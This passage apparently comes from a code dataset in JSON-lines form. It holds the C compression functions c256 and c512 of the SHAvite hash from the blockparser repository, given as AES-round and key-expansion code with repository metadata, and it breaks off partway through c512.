"None", "language": "c", "size": 1036}
{"docstring": "/*\n * This function assumes that \"msg\" is aligned for 32-bit access.\n */\n", "func_signal": "static void\nc256(sph_shavite_small_context *sc, const void *msg)", "code": "{\n\tsph_u32 p0, p1, p2, p3, p4, p5, p6, p7;\n\tsph_u32 x0, x1, x2, x3;\n\tsph_u32 rk0, rk1, rk2, rk3, rk4, rk5, rk6, rk7;\n\tsph_u32 rk8, rk9, rkA, rkB, rkC, rkD, rkE, rkF;\n\n\tp0 = sc->h[0x0];\n\tp1 = sc->h[0x1];\n\tp2 = sc->h[0x2];\n\tp3 = sc->h[0x3];\n\tp4 = sc->h[0x4];\n\tp5 = sc->h[0x5];\n\tp6 = sc->h[0x6];\n\tp7 = sc->h[0x7];\n\t/* round 0 */\n\trk0 = sph_dec32le_aligned((const unsigned char *)msg +  0);\n\tx0 = p4 ^ rk0;\n\trk1 = sph_dec32le_aligned((const unsigned char *)msg +  4);\n\tx1 = p5 ^ rk1;\n\trk2 = sph_dec32le_aligned((const unsigned char *)msg +  8);\n\tx2 = p6 ^ rk2;\n\trk3 = sph_dec32le_aligned((const unsigned char *)msg + 12);\n\tx3 = p7 ^ rk3;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\trk4 = sph_dec32le_aligned((const unsigned char *)msg + 16);\n\tx0 ^= rk4;\n\trk5 = sph_dec32le_aligned((const unsigned char *)msg + 20);\n\tx1 ^= rk5;\n\trk6 = sph_dec32le_aligned((const unsigned char *)msg + 24);\n\tx2 ^= rk6;\n\trk7 = sph_dec32le_aligned((const unsigned char *)msg + 28);\n\tx3 ^= rk7;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\trk8 = sph_dec32le_aligned((const unsigned char *)msg + 32);\n\tx0 ^= rk8;\n\trk9 = sph_dec32le_aligned((const unsigned char *)msg + 36);\n\tx1 ^= rk9;\n\trkA = sph_dec32le_aligned((const unsigned char *)msg + 40);\n\tx2 ^= rkA;\n\trkB = sph_dec32le_aligned((const unsigned char *)msg + 44);\n\tx3 ^= rkB;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\tp0 ^= x0;\n\tp1 ^= x1;\n\tp2 ^= x2;\n\tp3 ^= x3;\n\t/* round 1 */\n\trkC = sph_dec32le_aligned((const unsigned char *)msg + 48);\n\tx0 = p0 ^ rkC;\n\trkD = sph_dec32le_aligned((const unsigned char *)msg + 52);\n\tx1 = p1 ^ rkD;\n\trkE = sph_dec32le_aligned((const unsigned char *)msg + 56);\n\tx2 = p2 ^ rkE;\n\trkF = sph_dec32le_aligned((const unsigned char *)msg + 60);\n\tx3 = p3 ^ rkF;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\tKEY_EXPAND_ELT(rk0, rk1, rk2, rk3);\n\trk0 ^= rkC ^ sc->count0;\n\trk1 ^= rkD ^ SPH_T32(~sc->count1);\n\trk2 ^= rkE;\n\trk3 ^= rkF;\n\tx0 ^= rk0;\n\tx1 ^= rk1;\n\tx2 ^= rk2;\n\tx3 ^= rk3;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\tKEY_EXPAND_ELT(rk4, rk5, rk6, rk7);\n\trk4 ^= rk0;\n\trk5 ^= rk1;\n\trk6 ^= rk2;\n\trk7 ^= rk3;\n\tx0 ^= rk4;\n\tx1 ^= rk5;\n\tx2 ^= rk6;\n\tx3 ^= rk7;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\tp4 ^= x0;\n\tp5 ^= x1;\n\tp6 ^= x2;\n\tp7 ^= x3;\n\t/* round 2 */\n\tKEY_EXPAND_ELT(rk8, rk9, rkA, rkB);\n\trk8 ^= rk4;\n\trk9 ^= rk5;\n\trkA ^= rk6;\n\trkB ^= rk7;\n\tx0 = p4 ^ rk8;\n\tx1 = p5 ^ rk9;\n\tx2 = p6 ^ rkA;\n\tx3 = p7 ^ rkB;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\tKEY_EXPAND_ELT(rkC, rkD, rkE, rkF);\n\trkC ^= rk8;\n\trkD ^= rk9;\n\trkE ^= rkA;\n\trkF ^= rkB;\n\tx0 ^= rkC;\n\tx1 ^= rkD;\n\tx2 ^= rkE;\n\tx3 ^= rkF;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\trk0 ^= rkD;\n\tx0 ^= rk0;\n\trk1 ^= rkE;\n\tx1 ^= rk1;\n\trk2 ^= rkF;\n\tx2 ^= rk2;\n\trk3 ^= rk0;\n\tx3 ^= rk3;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\tp0 ^= x0;\n\tp1 ^= x1;\n\tp2 ^= x2;\n\tp3 ^= x3;\n\t/* round 3 */\n\trk4 ^= rk1;\n\tx0 = p0 ^ rk4;\n\trk5 ^= rk2;\n\tx1 = p1 ^ rk5;\n\trk6 ^= rk3;\n\tx2 = p2 ^ rk6;\n\trk7 ^= rk4;\n\tx3 = p3 ^ rk7;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\trk8 ^= rk5;\n\tx0 ^= rk8;\n\trk9 ^= rk6;\n\tx1 ^= rk9;\n\trkA ^= rk7;\n\tx2 ^= rkA;\n\trkB ^= rk8;\n\tx3 ^= rkB;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\trkC ^= rk9;\n\tx0 ^= rkC;\n\trkD ^= rkA;\n\tx1 ^= rkD;\n\trkE ^= rkB;\n\tx2 ^= rkE;\n\trkF ^= rkC;\n\tx3 ^= rkF;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\tp4 ^= x0;\n\tp5 ^= x1;\n\tp6 ^= x2;\n\tp7 ^= x3;\n\t/* round 4 */\n\tKEY_EXPAND_ELT(rk0, rk1, rk2, rk3);\n\trk0 ^= rkC;\n\trk1 ^= rkD;\n\trk2 ^= rkE;\n\trk3 ^= rkF;\n\tx0 = p4 ^ rk0;\n\tx1 = p5 ^ rk1;\n\tx2 = p6 ^ rk2;\n\tx3 = p7 ^ rk3;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\tKEY_EXPAND_ELT(rk4, rk5, rk6, rk7);\n\trk4 ^= rk0;\n\trk5 ^= rk1;\n\trk6 ^= rk2;\n\trk7 ^= rk3;\n\tx0 ^= rk4;\n\tx1 ^= rk5;\n\tx2 ^= rk6;\n\tx3 ^= rk7;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\tKEY_EXPAND_ELT(rk8, rk9, rkA, rkB);\n\trk8 ^= rk4;\n\trk9 ^= rk5 ^ sc->count1;\n\trkA ^= rk6 ^ SPH_T32(~sc->count0);\n\trkB ^= rk7;\n\tx0 ^= rk8;\n\tx1 ^= rk9;\n\tx2 ^= rkA;\n\tx3 ^= rkB;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\tp0 ^= x0;\n\tp1 ^= x1;\n\tp2 ^= x2;\n\tp3 ^= x3;\n\t/* round 5 */\n\tKEY_EXPAND_ELT(rkC, rkD, rkE, rkF);\n\trkC ^= rk8;\n\trkD ^= rk9;\n\trkE ^= rkA;\n\trkF ^= rkB;\n\tx0 = p0 ^ rkC;\n\tx1 = p1 ^ rkD;\n\tx2 = p2 ^ rkE;\n\tx3 = p3 ^ rkF;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\trk0 ^= rkD;\n\tx0 ^= rk0;\n\trk1 ^= rkE;\n\tx1 ^= rk1;\n\trk2 ^= rkF;\n\tx2 ^= rk2;\n\trk3 ^= rk0;\n\tx3 ^= rk3;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\trk4 ^= rk1;\n\tx0 ^= rk4;\n\trk5 ^= rk2;\n\tx1 ^= rk5;\n\trk6 ^= rk3;\n\tx2 ^= rk6;\n\trk7 ^= rk4;\n\tx3 ^= rk7;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\tp4 ^= x0;\n\tp5 ^= x1;\n\tp6 ^= x2;\n\tp7 ^= x3;\n\t/* round 6 */\n\trk8 ^= rk5;\n\tx0 = p4 ^ rk8;\n\trk9 ^= rk6;\n\tx1 = p5 ^ rk9;\n\trkA ^= rk7;\n\tx2 = p6 ^ rkA;\n\trkB ^= rk8;\n\tx3 = p7 ^ rkB;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\trkC ^= rk9;\n\tx0 ^= rkC;\n\trkD ^= rkA;\n\tx1 ^= rkD;\n\trkE ^= rkB;\n\tx2 ^= rkE;\n\trkF ^= rkC;\n\tx3 ^= rkF;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\tKEY_EXPAND_ELT(rk0, rk1, rk2, rk3);\n\trk0 ^= rkC;\n\trk1 ^= rkD;\n\trk2 ^= rkE;\n\trk3 ^= rkF;\n\tx0 ^= rk0;\n\tx1 ^= rk1;\n\tx2 ^= rk2;\n\tx3 ^= rk3;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\tp0 ^= x0;\n\tp1 ^= x1;\n\tp2 ^= x2;\n\tp3 ^= x3;\n\t/* round 7 */\n\tKEY_EXPAND_ELT(rk4, rk5, rk6, rk7);\n\trk4 ^= rk0;\n\trk5 ^= rk1;\n\trk6 ^= rk2 ^ sc->count1;\n\trk7 ^= rk3 ^ SPH_T32(~sc->count0);\n\tx0 = p0 ^ rk4;\n\tx1 = p1 ^ rk5;\n\tx2 = p2 ^ rk6;\n\tx3 = p3 ^ rk7;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\tKEY_EXPAND_ELT(rk8, rk9, rkA, rkB);\n\trk8 ^= rk4;\n\trk9 ^= rk5;\n\trkA ^= rk6;\n\trkB ^= rk7;\n\tx0 ^= rk8;\n\tx1 ^= rk9;\n\tx2 ^= rkA;\n\tx3 ^= rkB;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\tKEY_EXPAND_ELT(rkC, rkD, rkE, rkF);\n\trkC ^= rk8;\n\trkD ^= rk9;\n\trkE ^= rkA;\n\trkF ^= rkB;\n\tx0 ^= rkC;\n\tx1 ^= rkD;\n\tx2 ^= rkE;\n\tx3 ^= rkF;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\tp4 ^= x0;\n\tp5 ^= x1;\n\tp6 ^= x2;\n\tp7 ^= x3;\n\t/* round 8 */\n\trk0 ^= rkD;\n\tx0 = p4 ^ rk0;\n\trk1 ^= rkE;\n\tx1 = p5 ^ rk1;\n\trk2 ^= rkF;\n\tx2 = p6 ^ rk2;\n\trk3 ^= rk0;\n\tx3 = p7 ^ rk3;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\trk4 ^= rk1;\n\tx0 ^= rk4;\n\trk5 ^= rk2;\n\tx1 ^= rk5;\n\trk6 ^= rk3;\n\tx2 ^= rk6;\n\trk7 ^= rk4;\n\tx3 ^= rk7;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\trk8 ^= rk5;\n\tx0 ^= rk8;\n\trk9 ^= rk6;\n\tx1 ^= rk9;\n\trkA ^= rk7;\n\tx2 ^= rkA;\n\trkB ^= rk8;\n\tx3 ^= rkB;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\tp0 ^= x0;\n\tp1 ^= x1;\n\tp2 ^= x2;\n\tp3 ^= x3;\n\t/* round 9 */\n\trkC ^= rk9;\n\tx0 = p0 ^ rkC;\n\trkD ^= rkA;\n\tx1 = p1 ^ rkD;\n\trkE ^= rkB;\n\tx2 = p2 ^ rkE;\n\trkF ^= rkC;\n\tx3 = p3 ^ rkF;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\tKEY_EXPAND_ELT(rk0, rk1, rk2, rk3);\n\trk0 ^= rkC;\n\trk1 ^= rkD;\n\trk2 ^= rkE;\n\trk3 ^= rkF;\n\tx0 ^= rk0;\n\tx1 ^= rk1;\n\tx2 ^= rk2;\n\tx3 ^= rk3;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\tKEY_EXPAND_ELT(rk4, rk5, rk6, rk7);\n\trk4 ^= rk0;\n\trk5 ^= rk1;\n\trk6 ^= rk2;\n\trk7 ^= rk3;\n\tx0 ^= rk4;\n\tx1 ^= rk5;\n\tx2 ^= rk6;\n\tx3 ^= rk7;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\tp4 ^= x0;\n\tp5 ^= x1;\n\tp6 ^= x2;\n\tp7 ^= x3;\n\t/* round 10 */\n\tKEY_EXPAND_ELT(rk8, rk9, rkA, rkB);\n\trk8 ^= rk4;\n\trk9 ^= rk5;\n\trkA ^= rk6;\n\trkB ^= rk7;\n\tx0 = p4 ^ rk8;\n\tx1 = p5 ^ rk9;\n\tx2 = p6 ^ rkA;\n\tx3 = p7 ^ rkB;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\tKEY_EXPAND_ELT(rkC, rkD, rkE, rkF);\n\trkC ^= rk8 ^ sc->count0;\n\trkD ^= rk9;\n\trkE ^= rkA;\n\trkF ^= rkB ^ SPH_T32(~sc->count1);\n\tx0 ^= rkC;\n\tx1 ^= rkD;\n\tx2 ^= rkE;\n\tx3 ^= rkF;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\trk0 ^= rkD;\n\tx0 ^= rk0;\n\trk1 ^= rkE;\n\tx1 ^= rk1;\n\trk2 ^= rkF;\n\tx2 ^= rk2;\n\trk3 ^= rk0;\n\tx3 ^= rk3;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\tp0 ^= x0;\n\tp1 ^= x1;\n\tp2 ^= x2;\n\tp3 ^= x3;\n\t/* round 11 */\n\trk4 ^= rk1;\n\tx0 = p0 ^ rk4;\n\trk5 ^= rk2;\n\tx1 = p1 ^ rk5;\n\trk6 ^= rk3;\n\tx2 = p2 ^ rk6;\n\trk7 ^= rk4;\n\tx3 = p3 ^ rk7;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\trk8 ^= rk5;\n\tx0 ^= rk8;\n\trk9 ^= rk6;\n\tx1 ^= rk9;\n\trkA ^= rk7;\n\tx2 ^= rkA;\n\trkB ^= rk8;\n\tx3 ^= rkB;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\trkC ^= rk9;\n\tx0 ^= rkC;\n\trkD ^= rkA;\n\tx1 ^= rkD;\n\trkE ^= rkB;\n\tx2 ^= rkE;\n\trkF ^= rkC;\n\tx3 ^= rkF;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\tp4 ^= x0;\n\tp5 ^= x1;\n\tp6 ^= x2;\n\tp7 ^= x3;\n\tsc->h[0x0] ^= p0;\n\tsc->h[0x1] ^= p1;\n\tsc->h[0x2] ^= p2;\n\tsc->h[0x3] ^= p3;\n\tsc->h[0x4] ^= p4;\n\tsc->h[0x5] ^= p5;\n\tsc->h[0x6] ^= p6;\n\tsc->h[0x7] ^= p7;\n}", "path": "blockparser/h9/shavite.c", "commit_date": "2014-08-20 00:00:00", "repo_name": "znort987/blockparser", "stars": 529, "license": "None", "language": "c", "size": 1036}
{"docstring": "/*\n * This function assumes that \"msg\" is aligned for 32-bit access.\n */\n", "func_signal": "static void\nc512(sph_shavite_big_context *sc, const void *msg)", "code": "{\n\tsph_u32 p0, p1, p2, p3, p4, p5, p6, p7;\n\tsph_u32 p8, p9, pA, pB, pC, pD, pE, pF;\n\tsph_u32 x0, x1, x2, x3;\n\tsph_u32 rk00, rk01, rk02, rk03, rk04, rk05, rk06, rk07;\n\tsph_u32 rk08, rk09, rk0A, rk0B, rk0C, rk0D, rk0E, rk0F;\n\tsph_u32 rk10, rk11, rk12, rk13, rk14, rk15, rk16, rk17;\n\tsph_u32 rk18, rk19, rk1A, rk1B, rk1C, rk1D, rk1E, rk1F;\n\tint r;\n\n\tp0 = sc->h[0x0];\n\tp1 = sc->h[0x1];\n\tp2 = sc->h[0x2];\n\tp3 = sc->h[0x3];\n\tp4 = sc->h[0x4];\n\tp5 = sc->h[0x5];\n\tp6 = sc->h[0x6];\n\tp7 = sc->h[0x7];\n\tp8 = sc->h[0x8];\n\tp9 = sc->h[0x9];\n\tpA = sc->h[0xA];\n\tpB = sc->h[0xB];\n\tpC = sc->h[0xC];\n\tpD = sc->h[0xD];\n\tpE = sc->h[0xE];\n\tpF = sc->h[0xF];\n\t/* round 0 */\n\trk00 = sph_dec32le_aligned((const unsigned char *)msg +   0);\n\tx0 = p4 ^ rk00;\n\trk01 = sph_dec32le_aligned((const unsigned char *)msg +   4);\n\tx1 = p5 ^ rk01;\n\trk02 = sph_dec32le_aligned((const unsigned char *)msg +   8);\n\tx2 = p6 ^ rk02;\n\trk03 = sph_dec32le_aligned((const unsigned char *)msg +  12);\n\tx3 = p7 ^ rk03;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\trk04 = sph_dec32le_aligned((const unsigned char *)msg +  16);\n\tx0 ^= rk04;\n\trk05 = sph_dec32le_aligned((const unsigned char *)msg +  20);\n\tx1 ^= rk05;\n\trk06 = sph_dec32le_aligned((const unsigned char *)msg +  24);\n\tx2 ^= rk06;\n\trk07 = sph_dec32le_aligned((const unsigned char *)msg +  28);\n\tx3 ^= rk07;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\trk08 = sph_dec32le_aligned((const unsigned char *)msg +  32);\n\tx0 ^= rk08;\n\trk09 = sph_dec32le_aligned((const unsigned char *)msg +  36);\n\tx1 ^= rk09;\n\trk0A = sph_dec32le_aligned((const unsigned char *)msg +  40);\n\tx2 ^= rk0A;\n\trk0B = sph_dec32le_aligned((const unsigned char *)msg +  44);\n\tx3 ^= rk0B;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\trk0C = sph_dec32le_aligned((const unsigned char *)msg +  48);\n\tx0 ^= rk0C;\n\trk0D = sph_dec32le_aligned((const unsigned char *)msg +  52);\n\tx1 ^= rk0D;\n\trk0E = sph_dec32le_aligned((const unsigned char *)msg +  56);\n\tx2 ^= rk0E;\n\trk0F = sph_dec32le_aligned((const unsigned char *)msg +  60);\n\tx3 ^= rk0F;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\tp0 ^= x0;\n\tp1 ^= x1;\n\tp2 ^= x2;\n\tp3 ^= x3;\n\trk10 = sph_dec32le_aligned((const unsigned char *)msg +  64);\n\tx0 = pC ^ rk10;\n\trk11 = sph_dec32le_aligned((const unsigned char *)msg +  68);\n\tx1 = pD ^ rk11;\n\trk12 = sph_dec32le_aligned((const unsigned char *)msg +  72);\n\tx2 = pE ^ rk12;\n\trk13 = sph_dec32le_aligned((const unsigned char *)msg +  76);\n\tx3 = pF ^ rk13;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\trk14 = sph_dec32le_aligned((const unsigned char *)msg +  80);\n\tx0 ^= rk14;\n\trk15 = sph_dec32le_aligned((const unsigned char *)msg +  84);\n\tx1 ^= rk15;\n\trk16 = sph_dec32le_aligned((const unsigned char *)msg +  88);\n\tx2 ^= rk16;\n\trk17 = sph_dec32le_aligned((const unsigned char *)msg +  92);\n\tx3 ^= rk17;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\trk18 = sph_dec32le_aligned((const unsigned char *)msg +  96);\n\tx0 ^= rk18;\n\trk19 = sph_dec32le_aligned((const unsigned char *)msg + 100);\n\tx1 ^= rk19;\n\trk1A = sph_dec32le_aligned((const unsigned char *)msg + 104);\n\tx2 ^= rk1A;\n\trk1B = sph_dec32le_aligned((const unsigned char *)msg + 108);\n\tx3 ^= rk1B;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\trk1C = sph_dec32le_aligned((const unsigned char *)msg + 112);\n\tx0 ^= rk1C;\n\trk1D = sph_dec32le_aligned((const unsigned char *)msg + 116);\n\tx1 ^= rk1D;\n\trk1E = sph_dec32le_aligned((const unsigned char *)msg + 120);\n\tx2 ^= rk1E;\n\trk1F = sph_dec32le_aligned((const unsigned char *)msg + 124);\n\tx3 ^= rk1F;\n\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\tp8 ^= x0;\n\tp9 ^= x1;\n\tpA ^= x2;\n\tpB ^= x3;\n\n\tfor (r = 0; r < 3; r ++) {\n\t\t/* round 1, 5, 9 */\n\t\tKEY_EXPAND_ELT(rk00, rk01, rk02, rk03);\n\t\trk00 ^= rk1C;\n\t\trk01 ^= rk1D;\n\t\trk02 ^= rk1E;\n\t\trk03 ^= rk1F;\n\t\tif (r == 0) {\n\t\t\trk00 ^= sc->count0;\n\t\t\trk01 ^= sc->count1;\n\t\t\trk02 ^= sc->count2;\n\t\t\trk03 ^= SPH_T32(~sc->count3);\n\t\t}\n\t\tx0 = p0 ^ rk00;\n\t\tx1 = p1 ^ rk01;\n\t\tx2 = p2 ^ rk02;\n\t\tx3 = p3 ^ rk03;\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\t\tKEY_EXPAND_ELT(rk04, rk05, rk06, rk07);\n\t\trk04 ^= rk00;\n\t\trk05 ^= rk01;\n\t\trk06 ^= rk02;\n\t\trk07 ^= rk03;\n\t\tif (r == 1) {\n\t\t\trk04 ^= sc->count3;\n\t\t\trk05 ^= sc->count2;\n\t\t\trk06 ^= sc->count1;\n\t\t\trk07 ^= SPH_T32(~sc->count0);\n\t\t}\n\t\tx0 ^= rk04;\n\t\tx1 ^= rk05;\n\t\tx2 ^= rk06;\n\t\tx3 ^= rk07;\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\t\tKEY_EXPAND_ELT(rk08, rk09, rk0A, rk0B);\n\t\trk08 ^= rk04;\n\t\trk09 ^= rk05;\n\t\trk0A ^= rk06;\n\t\trk0B ^= rk07;\n\t\tx0 ^= rk08;\n\t\tx1 ^= rk09;\n\t\tx2 ^= rk0A;\n\t\tx3 ^= rk0B;\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\t\tKEY_EXPAND_ELT(rk0C, rk0D, rk0E, rk0F);\n\t\trk0C ^= rk08;\n\t\trk0D ^= rk09;\n\t\trk0E ^= rk0A;\n\t\trk0F ^= rk0B;\n\t\tx0 ^= rk0C;\n\t\tx1 ^= rk0D;\n\t\tx2 ^= rk0E;\n\t\tx3 ^= rk0F;\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\t\tpC ^= x0;\n\t\tpD ^= x1;\n\t\tpE ^= x2;\n\t\tpF ^= x3;\n\t\tKEY_EXPAND_ELT(rk10, rk11, rk12, rk13);\n\t\trk10 ^= rk0C;\n\t\trk11 ^= rk0D;\n\t\trk12 ^= rk0E;\n\t\trk13 ^= rk0F;\n\t\tx0 = p8 ^ rk10;\n\t\tx1 = p9 ^ rk11;\n\t\tx2 = pA ^ rk12;\n\t\tx3 = pB ^ rk13;\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\t\tKEY_EXPAND_ELT(rk14, rk15, rk16, rk17);\n\t\trk14 ^= rk10;\n\t\trk15 ^= rk11;\n\t\trk16 ^= rk12;\n\t\trk17 ^= rk13;\n\t\tx0 ^= rk14;\n\t\tx1 ^= rk15;\n\t\tx2 ^= rk16;\n\t\tx3 ^= rk17;\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\t\tKEY_EXPAND_ELT(rk18, rk19, rk1A, rk1B);\n\t\trk18 ^= rk14;\n\t\trk19 ^= rk15;\n\t\trk1A ^= rk16;\n\t\trk1B ^= rk17;\n\t\tx0 ^= rk18;\n\t\tx1 ^= rk19;\n\t\tx2 ^= rk1A;\n\t\tx3 ^= rk1B;\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\t\tKEY_EXPAND_ELT(rk1C, rk1D, rk1E, rk1F);\n\t\trk1C ^= rk18;\n\t\trk1D ^= rk19;\n\t\trk1E ^= rk1A;\n\t\trk1F ^= rk1B;\n\t\tif (r == 2) {\n\t\t\trk1C ^= sc->count2;\n\t\t\trk1D ^= sc->count3;\n\t\t\trk1E ^= sc->count0;\n\t\t\trk1F ^= SPH_T32(~sc->count1);\n\t\t}\n\t\tx0 ^= rk1C;\n\t\tx1 ^= rk1D;\n\t\tx2 ^= rk1E;\n\t\tx3 ^= rk1F;\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\t\tp4 ^= x0;\n\t\tp5 ^= x1;\n\t\tp6 ^= x2;\n\t\tp7 ^= x3;\n\t\t/* round 2, 6, 10 */\n\t\trk00 ^= rk19;\n\t\tx0 = pC ^ rk00;\n\t\trk01 ^= rk1A;\n\t\tx1 = pD ^ rk01;\n\t\trk02 ^= rk1B;\n\t\tx2 = pE ^ rk02;\n\t\trk03 ^= rk1C;\n\t\tx3 = pF ^ rk03;\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\t\trk04 ^= rk1D;\n\t\tx0 ^= rk04;\n\t\trk05 ^= rk1E;\n\t\tx1 ^= rk05;\n\t\trk06 ^= rk1F;\n\t\tx2 ^= rk06;\n\t\trk07 ^= rk00;\n\t\tx3 ^= rk07;\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\t\trk08 ^= rk01;\n\t\tx0 ^= rk08;\n\t\trk09 ^= rk02;\n\t\tx1 ^= rk09;\n\t\trk0A ^= rk03;\n\t\tx2 ^= rk0A;\n\t\trk0B ^= rk04;\n\t\tx3 ^= rk0B;\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\t\trk0C ^= rk05;\n\t\tx0 ^= rk0C;\n\t\trk0D ^= rk06;\n\t\tx1 ^= rk0D;\n\t\trk0E ^= rk07;\n\t\tx2 ^= rk0E;\n\t\trk0F ^= rk08;\n\t\tx3 ^= rk0F;\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\t\tp8 ^= x0;\n\t\tp9 ^= x1;\n\t\tpA ^= x2;\n\t\tpB ^= x3;\n\t\trk10 ^= rk09;\n\t\tx0 = p4 ^ rk10;\n\t\trk11 ^= rk0A;\n\t\tx1 = p5 ^ rk11;\n\t\trk12 ^= rk0B;\n\t\tx2 = p6 ^ rk12;\n\t\trk13 ^= rk0C;\n\t\tx3 = p7 ^ rk13;\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\t\trk14 ^= rk0D;\n\t\tx0 ^= rk14;\n\t\trk15 ^= rk0E;\n\t\tx1 ^= rk15;\n\t\trk16 ^= rk0F;\n\t\tx2 ^= rk16;\n\t\trk17 ^= rk10;\n\t\tx3 ^= rk17;\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\t\trk18 ^= rk11;\n\t\tx0 ^= rk18;\n\t\trk19 ^= rk12;\n\t\tx1 ^= rk19;\n\t\trk1A ^= rk13;\n\t\tx2 ^= rk1A;\n\t\trk1B ^= rk14;\n\t\tx3 ^= rk1B;\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\t\trk1C ^= rk15;\n\t\tx0 ^= rk1C;\n\t\trk1D ^= rk16;\n\t\tx1 ^= rk1D;\n\t\trk1E ^= rk17;\n\t\tx2 ^= rk1E;\n\t\trk1F ^= rk18;\n\t\tx3 ^= rk1F;\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\t\tp0 ^= x0;\n\t\tp1 ^= x1;\n\t\tp2 ^= x2;\n\t\tp3 ^= x3;\n\t\t/* round 3, 7, 11 */\n\t\tKEY_EXPAND_ELT(rk00, rk01, rk02, rk03);\n\t\trk00 ^= rk1C;\n\t\trk01 ^= rk1D;\n\t\trk02 ^= rk1E;\n\t\trk03 ^= rk1F;\n\t\tx0 = p8 ^ rk00;\n\t\tx1 = p9 ^ rk01;\n\t\tx2 = pA ^ rk02;\n\t\tx3 = pB ^ rk03;\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\t\tKEY_EXPAND_ELT(rk04, rk05, rk06, rk07);\n\t\trk04 ^= rk00;\n\t\trk05 ^= rk01;\n\t\trk06 ^= rk02;\n\t\trk07 ^= rk03;\n\t\tx0 ^= rk04;\n\t\tx1 ^= rk05;\n\t\tx2 ^= rk06;\n\t\tx3 ^= rk07;\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\t\tKEY_EXPAND_ELT(rk08, rk09, rk0A, rk0B);\n\t\trk08 ^= rk04;\n\t\trk09 ^= rk05;\n\t\trk0A ^= rk06;\n\t\trk0B ^= rk07;\n\t\tx0 ^= rk08;\n\t\tx1 ^= rk09;\n\t\tx2 ^= rk0A;\n\t\tx3 ^= rk0B;\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\t\tKEY_EXPAND_ELT(rk0C, rk0D, rk0E, rk0F);\n\t\trk0C ^= rk08;\n\t\trk0D ^= rk09;\n\t\trk0E ^= rk0A;\n\t\trk0F ^= rk0B;\n\t\tx0 ^= rk0C;\n\t\tx1 ^= rk0D;\n\t\tx2 ^= rk0E;\n\t\tx3 ^= rk0F;\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\t\tp4 ^= x0;\n\t\tp5 ^= x1;\n\t\tp6 ^= x2;\n\t\tp7 ^= x3;\n\t\tKEY_EXPAND_ELT(rk10, rk11, rk12, rk13);\n\t\trk10 ^= rk0C;\n\t\trk11 ^= rk0D;\n\t\trk12 ^= rk0E;\n\t\trk13 ^= rk0F;\n\t\tx0 = p0 ^ rk10;\n\t\tx1 = p1 ^ rk11;\n\t\tx2 = p2 ^ rk12;\n\t\tx3 = p3 ^ rk13;\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\t\tKEY_EXPAND_ELT(rk14, rk15, rk16, rk17);\n\t\trk14 ^= rk10;\n\t\trk15 ^= rk11;\n\t\trk16 ^= rk12;\n\t\trk17 ^= rk13;\n\t\tx0 ^= rk14;\n\t\tx1 ^= rk15;\n\t\tx2 ^= rk16;\n\t\tx3 